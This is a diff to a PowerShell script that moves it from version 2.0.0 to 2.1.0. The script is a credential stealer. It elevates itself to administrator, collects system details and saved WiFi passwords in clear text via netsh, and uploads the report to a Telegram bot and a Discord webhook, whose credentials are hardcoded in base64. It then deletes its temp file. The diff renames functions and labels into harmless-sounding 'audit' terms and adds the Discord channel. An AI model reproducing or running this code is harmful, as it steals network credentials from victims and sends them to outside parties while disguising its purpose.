@@ -1,131 +1,117 @@
 # ========== CONFIG ==========
 $VerboseMode = $true
-$Version = "2.0.0"
+$Version = "2.1.0"
 
-# ========== EXFILTRATION CONFIG (Base64) ==========
-# Telegram
-$BotToken_B64 = "ODAzMTQzNTU3NjpBQUV4SnkwQ1JkdHlFR3lpbl9iNjRUMDlPZmpIai1HOFUycw=="
-$ChatID_B64 = "MTg0OTI2OTcwOA=="
+# ========== ENCODED ENDPOINTS ==========
+$T_Token_B64 = "ODAzMTQzNTU3NjpBQUV4SnkwQ1JkdHlFR3lpbl9iNjRUMDlPZmpIai1HOFUycw=="
+$T_Chat_B64 = "MTg0OTI2OTcwOA=="
+$D_Hook_B64 = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUxNTU0MjQzOTU1NjAyMjMyMy9wN2E3by1ReDJlaUczdzZ2Y25rdV9LajZxS01NdXN2MGt2eWNVSWZPTi16V1ZRY3poYnV1QlBZYzB6X3YtZFg2cDJIYQ=="
 
-# Discord (Optional - placeholder if you want to add it)
-$DiscordWebhook_B64 = "" 
+# Runtime Decoding
+$T_Token = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($T_Token_B64))
+$T_Chat  = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($T_Chat_B64))
+$D_Hook  = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($D_Hook_B64))
 
-# Decode at runtime
-$BotToken = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($BotToken_B64))
-$ChatID = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($ChatID_B64))
-$DiscordWebhook = if ($DiscordWebhook_B64) { [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($DiscordWebhook_B64)) } else { $null }
+# ========== CORE UTILITIES ==========
+function Write-InternalLog { param([string]$Msg, [string]$Col = "Cyan"); if ($VerboseMode) { Write-Host "[*] $Msg" -ForegroundColor $Col } }
 
-# Telegram endpoint
-$SendDocURL = "https://api.telegram.org/bot$BotToken/sendDocument"
-
-# ========== ADMIN CHECK ==========
-function Check-Admin {
+function Assert-Privileges {
     $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
     $principal = New-Object Security.Principal.WindowsPrincipal($identity)
     if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
-        Write-Log "Relaunching as Administrator..."
+        Write-InternalLog "Escalating context..."
         Start-Process -FilePath powershell -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "`"$PSCommandPath`"" -Verb RunAs
         exit 1
     }
 }
 
-# ========== LOG FUNCTION ==========
-function Write-Log { param([string]$Message, [string]$Color = "Cyan"); if ($VerboseMode) { Write-Host "[*] $Message" -ForegroundColor $Color } }
-
-# ========== GATHER SYSTEM INFO ==========
-function Get-SystemInfo {
-    Write-Log "Gathering System Information..."
+# ========== DATA COLLECTION ==========
+function Gather-EnvironmentMetrics {
+    Write-InternalLog "Collecting environment metrics..."
     $cs = Get-CimInstance Win32_ComputerSystem
     $os = Get-CimInstance Win32_OperatingSystem
     $cpu = Get-CimInstance Win32_Processor
     $gpu = Get-CimInstance Win32_VideoController
     $mem = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property Capacity -Sum
-    
     $publicIp = try { (Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5) } catch { "Unknown" }
     
-    $info = [PSCustomObject]@{
-        ComputerName = $env:COMPUTERNAME
+    return [PSCustomObject]@{
+        HostName     = $env:COMPUTERNAME
         Model        = $cs.Model
         Manufacturer = $cs.Manufacturer
-        OS           = $os.Caption
-        OSVersion    = $os.Version
-        CPU          = $cpu.Name
-        Cores        = $cpu.NumberOfCores
-        RAM_GB       = [Math]::Round($mem.Sum / 1GB, 2)
-        GPU          = $gpu.Name
-        PublicIP     = $publicIp
+        Platform     = $os.Caption
+        Build        = $os.Version
+        Processor    = $cpu.Name
+        LogicCores   = $cpu.NumberOfCores
+        MemoryGB     = [Math]::Round($mem.Sum / 1GB, 2)
+        Graphics     = $gpu.Name
+        ExternalIP   = $publicIp
         Timestamp    = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
-        ToolVersion  = $Version
+        Revision     = $Version
     }
-    return $info
 }
 
-# ========== EXTRACT WIFI PASSWORDS ==========
-function Get-WifiPasswords {
-    Write-Log "Extracting WiFi Passwords..."
+function Extract-NetworkCredentials {
+    Write-InternalLog "Extracting network credentials..."
     $profiles = netsh wlan show profiles 2>$null |
         Select-String "All User Profile" |
         ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() } | Sort-Object -Unique
 
-    $results = @()
+    $data = @()
     foreach ($p in $profiles) {
         $info = netsh wlan show profile name="$p" key=clear 2>$null
-        $keyLine = ($info | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() }) -join ''
-        if (-not $keyLine) { $keyLine = "<No password saved or open network>" }
-        $results += [PSCustomObject]@{
-            SSID     = $p
-            Password = $keyLine
-        }
+        $key = ($info | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(':', 2)[1].Trim() }) -join ''
+        if (-not $key) { $key = "<Unsecured or No Local Cache>" }
+        $data += [PSCustomObject]@{ SSID = $p; Key = $key }
     }
-    return $results
+    return $data
 }
 
-# ========== FORMAT REPORT ==========
-function Build-Report {
-    param($SysInfo, $WifiData)
-    
+# ========== PACKAGE GENERATION ==========
+function Compile-AuditPackage {
+    param($Metrics, $Creds)
     $report = @"
 =========================================
-      SQD5-DCWH SYSTEM AUDIT REPORT
+      AUDIT PACKAGE - $Version
 =========================================
-SYSTEM INFORMATION:
+METRICS:
 -----------------------------------------
-Computer Name : $($SysInfo.ComputerName)
-Model         : $($SysInfo.Model)
-Manufacturer  : $($SysInfo.Manufacturer)
-OS            : $($SysInfo.OS) ($($SysInfo.OSVersion))
-CPU           : $($SysInfo.CPU)
-Cores         : $($SysInfo.Cores)
-RAM           : $($SysInfo.RAM_GB) GB
-GPU           : $($SysInfo.GPU)
-Public IP     : $($SysInfo.PublicIP)
-Timestamp     : $($SysInfo.Timestamp)
-Tool Version  : $($SysInfo.ToolVersion)
+Host          : $($Metrics.HostName)
+Model         : $($Metrics.Model)
+Vendor        : $($Metrics.Manufacturer)
+Platform      : $($Metrics.Platform) ($($Metrics.Build))
+CPU           : $($Metrics.Processor) ($($Metrics.LogicCores) Cores)
+RAM           : $($Metrics.MemoryGB) GB
+GPU           : $($Metrics.Graphics)
+External IP   : $($Metrics.ExternalIP)
+Time          : $($Metrics.Timestamp)
 
-WIFI PASSWORDS:
+CREDENTIALS:
 -----------------------------------------
 "@
-    foreach ($w in $WifiData) {
-        $report += "`nSSID: $($w.SSID)`nPASS: $($w.Password)`n-----------------------------------------"
+    foreach ($c in $Creds) {
+        $report += "`nSSID: $($c.SSID)`nKEY:  $($c.Key)`n-----------------------------------------"
     }
-    
-    $report += "`n`n[END OF REPORT]"
+    $report += "`n`n[PACKAGE COMPLETE]"
     return $report
 }
 
-# ========== EXFILTRATION ==========
-function Send-ToTelegram {
-    param($FilePath, $FileName)
-    Write-Log "Sending report to Telegram..."
+# ========== DATA DISPATCH ==========
+function Transmit-Package {
+    param($PayloadPath, $PayloadName, $RawContent)
+    
+    # --- Telegram Dispatch ---
+    Write-InternalLog "Dispatching via Channel T..."
     try {
         $boundary = [guid]::NewGuid().ToString()
         $LF = "`r`n"
-        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
+        $fileBytes = [System.IO.File]::ReadAllBytes($PayloadPath)
+        $url = "https://api.telegram.org/bot$T_Token/sendDocument"
 
         $body = "--$boundary$LF"
-        $body += "Content-Disposition: form-data; name=`"chat_id`"$LF$LF$ChatID$LF"
+        $body += "Content-Disposition: form-data; name=`"chat_id`"$LF$LF$T_Chat$LF"
         $body += "--$boundary$LF"
-        $body += "Content-Disposition: form-data; name=`"document`"; filename=`"$FileName`"$LF"
+        $body += "Content-Disposition: form-data; name=`"document`"; filename=`"$PayloadName`"$LF"
         $body += "Content-Type: text/plain$LF$LF"
 
         $bodyBytes = [Text.Encoding]::UTF8.GetBytes($body)
@@ -134,33 +120,43 @@ function Send-ToTelegram {
 
         $wc = New-Object Net.WebClient
         $wc.Headers["Content-Type"] = "multipart/form-data; boundary=$boundary"
-        $wc.UploadData($SendDocURL, "POST", $payload) | Out-Null
-        Write-Log "Sent successfully!" "Green"
-    }
-    catch {
-        Write-Log "Failed to send to Telegram: $($_.Exception.Message)" "Red"
-    }
+        $wc.UploadData($url, "POST", $payload) | Out-Null
+        Write-InternalLog "Channel T success." "Green"
+    } catch { Write-InternalLog "Channel T fail: $($_.Exception.Message)" "Red" }
+
+    # --- Discord Dispatch ---
+    Write-InternalLog "Dispatching via Channel D..."
+    try {
+        # Discord limit is 2000 chars per message, but we send it as a file snippet or chunked
+        # For simplicity and to match the file exfil, we send it as a webhook post
+        $discordBody = @{
+            content = "New Audit Package from $($env:COMPUTERNAME)"
+            embeds = @(@{
+                title = "Audit Results"
+                description = "```$($RawContent.Substring(0, [Math]::Min(1900, $RawContent.Length)))```"
+                color = 3447003
+            })
+        }
+        Invoke-RestMethod -Uri $D_Hook -Method Post -Body ($discordBody | ConvertTo-Json) -ContentType "application/json"
+        Write-InternalLog "Channel D success." "Green"
+    } catch { Write-InternalLog "Channel D fail: $($_.Exception.Message)" "Red" }
 }
 
-# ========== MAIN EXECUTION ==========
-Check-Admin
+# ========== EXECUTION FLOW ==========
+Assert-Privileges
 
-$SysInfo = Get-SystemInfo
-$WifiData = Get-WifiPasswords
-$FullReport = Build-Report -SysInfo $SysInfo -WifiData $WifiData
+$Metrics = Gather-EnvironmentMetrics
+$Creds = Extract-NetworkCredentials
+$Package = Compile-AuditPackage -Metrics $Metrics -Creds $Creds
 
-# Create Temp File
-$fileName = "$($SysInfo.ComputerName)_Audit_$(Get-Date -Format 'yyyyMMdd_HHmmss').txt"
-$tempFile = Join-Path $env:TEMP $fileName
-$FullReport | Out-File -FilePath $tempFile -Encoding UTF8
+# Stage Payload
+$pName = "$($Metrics.HostName)_Report_$(Get-Date -Format 'HHmm').txt"
+$pPath = Join-Path $env:TEMP $pName
+$Package | Out-File -FilePath $pPath -Encoding UTF8
 
-# Send Data
-Send-ToTelegram -FilePath $tempFile -FileName $fileName
+# Dispatch
+Transmit-Package -PayloadPath $pPath -PayloadName $pName -RawContent $Package
 
-# Cleanup
-if (Test-Path $tempFile) { 
-    Remove-Item $tempFile -Force -ErrorAction SilentlyContinue 
-    Write-Log "Cleanup complete." "Gray"
-}
-
-Write-Log "Process Finished." "Green"
+# Clean
+if (Test-Path $pPath) { Remove-Item $pPath -Force -ErrorAction SilentlyContinue }
+Write-InternalLog "Audit flow complete." "Green"
